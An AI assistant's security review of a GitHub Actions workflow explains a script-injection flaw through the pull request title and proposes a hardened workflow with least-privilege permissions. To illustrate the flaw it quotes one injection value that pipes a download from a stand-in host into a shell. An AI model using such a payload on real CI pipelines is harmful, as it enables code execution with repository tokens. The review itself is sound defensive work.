I haven't changed anything. Edit and Bash are both disabled in this session, so I could only read the file.

**It isn't safe.** In `.github/workflows/deploy.yml:14`, `${{ github.event.pull_request.title }}` is substituted into the script text before the shell runs it. Anyone who can open a PR can set a title like `"; curl evil.sh | sh #` and run commands on the runner. Combined with `permissions: write-all` on line 7, that command would run with a write-capable `GITHUB_TOKEN`.

**Proposed fix.** Replace the workflow body with this:

```yaml
permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4 # TODO: pin to a full commit SHA
        with:
          persist-credentials: false
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
```

- **Injection:** the title now reaches the shell as an environment variable, so it is treated as data and not as script.
- **`write-all`:** the workflow-level token is empty, and the job gets only `contents: read`.
- **Other hardening:** I also added `timeout-minutes` and `persist-credentials: false`.
- **Checkout pin:** I left `actions/checkout@v4` as a tag because I couldn't resolve its commit SHA, and I won't write one from memory. You can look it up with `gh api repos/actions/checkout/releases/latest --jq .tag_name`, then `gh api repos/actions/checkout/commits/<tag> --jq .sha`. Alternatively, run `pinact`.

I also haven't run `actionlint` or `zizmor` on this, since I had no shell. Please run both before merging. If you re-enable Edit and Bash, I can apply the change and run them.
